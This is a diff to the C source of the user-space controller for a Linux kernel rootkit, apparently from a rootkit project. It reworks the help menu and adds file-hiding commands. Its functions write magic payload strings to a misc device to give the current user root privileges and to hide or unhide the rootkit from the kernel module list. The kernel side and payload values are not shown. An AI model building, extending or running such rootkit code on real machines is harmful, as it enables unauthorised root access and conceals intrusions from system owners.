@@ -2,8 +2,8 @@
 
 #include "../include/debug.h"
 
-int show_info(){
-
+int show_info()
+{
     printf("misc device name=%s \n", RK_DRIVER);
     printf("path=/dev/%s \n", RK_DRIVER);
     printf("privesc payload=\"%s\" \n", RK_PRIVESC);
@@ -13,23 +13,25 @@ int show_info(){
     return 0;
 }
 
-int display_help(char * filename){
-
+int display_help(char * filename)
+{
     printf("Usage: \n");
     printf("    %s <operation>\n", filename+2);
     printf("\n");
     printf("Operations: \n");
-    printf("    -h, --help      Display this menu\n");
-    printf("    -p, --privesc   Give root privileges to the current user\n");
-    printf("    -i, --info      Display infos about the rootkit\n");
-    printf("    --hide          Hide the rootkit from modules list\n");
-    printf("    --unhide        Unhide the rootkit from module list (then allow us to remove the rootkit)\n");
+    printf("    -h, help        Display this menu\n");
+    printf("    privesc         Give root privileges to the current user\n");
+    printf("    info            Display infos about the rootkit\n");
+    printf("    hide            Hide the rootkit from modules list\n");
+    printf("    unhide          Unhide the rootkit from module list (then allow us to remove the rootkit)\n");
+    printf("    fhide <name>    Hide a file from the file system\n");
+    printf("    funhide <name>  Unhide a file from the file system\n");
 
     return 0;
 }
 
-int privesc(char *driver){
-
+int privesc(char *driver)
+{
     int ret;
     int fd = open(driver, O_WRONLY);
     const char * payload = RK_PRIVESC;
@@ -46,8 +48,8 @@ int privesc(char *driver){
     return 0;
 }
 
-int hide(char *driver){
-
+int hide(char *driver)
+{
     int ret;
     int fd = open(driver, O_WRONLY);
     const char * payload = RK_HIDE;
@@ -65,8 +67,8 @@ int hide(char *driver){
     return 0;
 }
 
-int unhide(char *driver){
-
+int unhide(char *driver)
+{
     int ret;
     int fd = open(driver, O_WRONLY);
     const char * payload = RK_REVEAL;
